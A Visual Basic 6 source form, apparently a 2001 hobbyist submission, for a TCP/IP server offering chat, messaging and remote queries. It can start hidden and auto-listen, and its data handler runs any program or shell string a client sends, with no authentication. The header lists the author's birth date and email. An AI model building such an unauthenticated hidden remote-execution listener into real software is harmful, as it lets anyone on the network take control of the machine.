VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Server 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "General TCP\IP Server"
   ClientHeight    =   4515
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   4680
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "Settings.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   4515
   ScaleWidth      =   4680
   StartUpPosition =   2  'CenterScreen
   Begin MSWinsockLib.Winsock WinSock 
      Left            =   1425
      Top             =   4080
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   1029
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Close Server"
      Height          =   315
      Left            =   3435
      TabIndex        =   2
      Top             =   4155
      Width           =   1140
   End
   Begin VB.Frame Frame1 
      Caption         =   "TCP\IP Server"
      Height          =   3705
      Left            =   75
      TabIndex        =   1
      Top             =   345
      Width           =   4500
      Begin VB.CheckBox chkHideServer 
         Caption         =   "Start Server Hidden"
         Height          =   210
         Left            =   2610
         TabIndex        =   17
         Top             =   900
         Width           =   1755
      End
      Begin VB.CheckBox chkAutoListen 
         Caption         =   "Enable Auto-Listen"
         Height          =   210
         Left            =   2610
         TabIndex        =   16
         Top             =   630
         Width           =   1755
      End
      Begin VB.TextBox txtLocalPort 
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C0C0&
         ForeColor       =   &H00008000&
         Height          =   240
         Left            =   1395
         TabIndex        =   15
         Text            =   "1029"
         Top             =   855
         Width           =   885
      End
      Begin VB.Frame Frame3 
         Caption         =   "Sent Data"
         Height          =   975
         Left            =   150
         TabIndex        =   12
         Top             =   2565
         Width           =   4185
         Begin VB.ListBox SentData 
            Height          =   645
            Left            =   135
            TabIndex        =   13
            Top             =   195
            Width           =   3900
         End
      End
      Begin VB.Frame Frame2 
         Caption         =   "Recieved Data"
         Height          =   975
         Left            =   150
         TabIndex        =   10
         Top             =   1530
         Width           =   4185
         Begin VB.ListBox RecData 
            Height          =   645
            Left            =   135
            TabIndex        =   11
            Top             =   195
            Width           =   3900
         End
      End
      Begin VB.CommandButton cmdListen 
         Caption         =   "Start Server"
         Default         =   -1  'True
         Height          =   300
         Left            =   150
         TabIndex        =   8
         Top             =   1200
         Width           =   1185
      End
      Begin VB.Label Stat 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Waiting to start..."
         ForeColor       =   &H000000FF&
         Height          =   240
         Left            =   1440
         TabIndex        =   9
         Top             =   1230
         Width           =   2895
      End
      Begin VB.Label Label5 
         Caption         =   "Local Port"
         ForeColor       =   &H00C00000&
         Height          =   225
         Left            =   165
         TabIndex        =   7
         Top             =   885
         Width           =   1260
      End
      Begin VB.Label lblComputer 
         AutoSize        =   -1  'True
         Caption         =   "Please Wait"
         ForeColor       =   &H00008000&
         Height          =   195
         Left            =   1425
         TabIndex        =   6
         Top             =   600
         Width           =   840
      End
      Begin VB.Label Label3 
         Caption         =   "Local Computer"
         ForeColor       =   &H00C00000&
         Height          =   225
         Left            =   165
         TabIndex        =   5
         Top             =   600
         Width           =   1260
      End
      Begin VB.Label lblIP 
         AutoSize        =   -1  'True
         Caption         =   "Please Wait"
         ForeColor       =   &H00008000&
         Height          =   195
         Left            =   1425
         TabIndex        =   4
         Top             =   300
         Width           =   840
      End
      Begin VB.Label Label2 
         Caption         =   "Local IP Address"
         ForeColor       =   &H00C00000&
         Height          =   225
         Left            =   165
         TabIndex        =   3
         Top             =   300
         Width           =   1260
      End
   End
   Begin VB.Label Label4 
      BackStyle       =   0  'Transparent
      Caption         =   "2001 Matthew Hall"
      ForeColor       =   &H00808080&
      Height          =   240
      Left            =   30
      TabIndex        =   14
      Top             =   4290
      Width           =   1395
   End
   Begin VB.Label Label1 
      Caption         =   "BETA 2"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   195
      Left            =   60
      TabIndex        =   0
      Top             =   30
      Width           =   1035
   End
End
Attribute VB_Name = "Server"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Planet Source Code Submission
'=============================
'Author Name:   Matt Hall
'D.O.B:         29 DEC 84
'Mug Shot:      www.faceparty.com\cyberdude69b
'Contact:       matt_hall44@ hotmail.com
'
'Date Started   Unknown
'Date Finished: Unknown
'Total Hours:   10.5
'
'Project Title: General TCP\IP Client
'Version:       2.0
'Credits:       PROBas.bas by Unknown author
'               Some icons taken from the Microsoft(R) Windows(R)
'               Operating System.
'
'Description:   Allows application of TCP\IP network communication via two seperate
'               applications.. You can Query Current Windows Username, Execute EXE file,
'               Toggle Hide Server, Query IP Address (for DNS resolution), Send Instant
'               Message, Windows ShellExec and RSA Skipjack Encrypted Chat. It is very easy
'               to implement more features into the project, just take a quick delve into the
'               code and all will be clear!

'Assumes:       Microsoft Winsock Control [Included]
'               Microsoft Windows 9x\ME\NT\2000\XP Operating System
'
'Notes:         You can find settings for TCP IP Client\Server in XSERV.INI in the Server Folder
'
'               Got problems or queries about this submission? E-Post me at matt_hall44@hotmail.com
'
'               *********************************************************************************
'               Although every step is taken to prevent it;
'
'               I CANNOT BE HELD RESPONSIBLE FOR ANY DATA LOSS OR CORRUPTION TO YOUR COMPUTER,
'               CAUSED DIRECTLY OR INDIRECTLY BY USAGE OF THE FILES PROVIDED IN THIS ARCHIVE SET.
'               *********************************************************************************
Dim AUTOLISTEN As Integer

Private Sub cmdListen_Click()
On Error GoTo werr:
cmdListen.Enabled = False
If E_Chat.Visible = True Then Unload E_Chat
If IM.Visible = True Then Unload IM
Stat = "Server Active. Waiting for connection request."
If IsNumeric(txtLocalPort) = False Then txtLocalPort = 1029
WinSock.LocalPort = txtLocalPort
txtLocalPort.Locked = True
WinSock.Listen
Exit Sub
werr:
MsgBox "Winsock error: " + Err.Description, 16
End Sub

Private Sub Command1_Click()
End
End Sub

Private Sub Form_Load()
If App.PrevInstance = True Then MsgBox "Server running already!", 16: End
'Get server settings
On Error Resume Next
chkAutoListen.Value = INIGetSetting("TCPIP Server", "autolisten", App.Path + "\X-Serv.ini")
chkHideServer.Value = INIGetSetting("TCPIP Server", "hideserver", App.Path + "\X-Serv.ini")

lblIP = WinSock.LocalIP
txtLocalPort = WinSock.LocalPort
lblComputer = WinSock.LocalHostName
txtLocalPort = INIGetSetting("TCPIP Server", "localport", App.Path + "\X-Serv.ini")
If txtLocalPort = "" Then txtLocalPort = 1029
If IsNumeric(txtLocalPort) = False Then txtLocalPort = 1029
If INIGetSetting("TCPIP Server", "autolisten", App.Path + "\X-Serv.ini") = "1" Then cmdListen_Click: AUTOLISTEN = 1
If INIGetSetting("TCPIP Server", "hideserver", App.Path + "\X-Serv.ini") = "1" Then Me.Visible = False
End Sub
Private Sub chkAutoListen_Click()
INISaveSetting chkAutoListen.Value, "TCPIP Server", "autolisten", App.Path + "\X-Serv.ini"
End Sub

Private Sub chkHideServer_Click()
INISaveSetting chkHideServer.Value, "TCPIP Server", "hideserver", App.Path + "\X-Serv.ini"
End Sub

Private Sub txtLocalPort_Change()
If txtLocalPort = "" Then txtLocalPort = 1029
If IsNumeric(txtLocalPort) = False Then txtLocalPort = 1029
If Not txtLocalPort = "" Then PROBas.INISaveSetting txtLocalPort.text, "TCPIP Server", "localport", App.Path + "\X-Serv.ini"
End Sub

Private Sub WinSock_Close()
If E_Chat.Visible = True Then Unload E_Chat
If IM.Visible = True Then Unload IM
WinSock.Close
End Sub

Private Sub WinSock_ConnectionRequest(ByVal requestID As Long)
On Error Resume Next
' Check if the control's State is closed. If not,
' close the connection before accepting the new
' connection.
Stat = "Connection Request... (" & requestID & ")"
If WinSock.State <> sckClosed Then _
WinSock.SendData "Another client has connected to this server. You have been disconnected": WinSock.Close

' Accept the request with the requestID
' parameter.
If E_Chat.Visible = True Then Unload E_Chat
If IM.Visible = True Then Unload IM

WinSock.Accept requestID
Call sndMedia.PlayWav(App.Path + "\connected.wav")
Stat = "Connnected to client. Awaiting Data"
End Sub

Public Sub SendStrData(strdata As String)
WinSock.SendData strdata
SentData.AddItem strdata
End Sub

Private Sub WinSock_DataArrival(ByVal bytesTotal As Long)
' Declare a variable for the incoming data.
' Invoke the GetData method and set the Text
' property of a TextBox named txtOutput to
' the data.
Dim strDataz As String
WinSock.GetData strDataz
ProcessIncomingData (strDataz)
End Sub

Public Sub ProcessIncomingData(DataRecieved As String)
RecData.AddItem DataRecieved
Select Case DataRecieved
Case "1" 'Query UserName
Stat = "Sent query back to client."
SendStrData PROBas.GetNetworkUserName + " is logged on to " + lblComputer

Case "3"  'Toggle Hide Server
Me.Visible = Not Me.Visible

Case "4" 'Close Connection
WinSock.Close
If E_Chat.Visible = True Then Unload E_Chat
If IM.Visible = True Then Unload IM
Stat = "Waiting to start..."
cmdListen.Enabled = True
txtLocalPort.Locked = False
SentData.Clear
RecData.Clear
Stat = "Waiting to start..."
If AUTOLISTEN = 1 Then cmdListen_Click
Exit Sub

Case "5"  'Query IP
Stat = "Sent query back to client."
SendStrData lblComputer + " IP: " & WinSock.LocalIP

Case "8"  'Query port
Stat = "Sent query back to client."
SendStrData lblComputer + " Port: " & WinSock.LocalPort

Case Else

If Left(DataRecieved, 1) = "C" Then 'Start Encrypted Chat Session
Stat = "Recieved Private Encrypted Chat Protocol."
E_Chat.Show
E_Chat.AddLine PROBas.IntelliCrypt_DeCrypt(Right(DataRecieved, Len(DataRecieved) - 1))
Exit Sub
End If

If Left(DataRecieved, 1) = "6" Then 'Show IM
Stat = "Recieved IM!"
IM.Show
IM.Text1 = Right(DataRecieved, Len(DataRecieved) - 1)
Exit Sub
End If

If Left(DataRecieved, 1) = "7" Then 'Windows Exec
Stat = "Executed Shellstring."
OpenIt Server, Right(DataRecieved, Len(DataRecieved) - 1)
Exit Sub
End If


If Left(DataRecieved, 1) = "2" Then 'Shell EXE
Stat = "Shelled EXE file."
On Error Resume Next
Shell Right(DataRecieved, Len(DataRecieved) - 1), vbNormalFocus
Exit Sub
End If

'Data not in control set
If Me.Visible = True Then MsgBox "The data recieved is not recognised.", 16


End Select

Stat = "Connnected to client. Awaiting Data"
End Sub
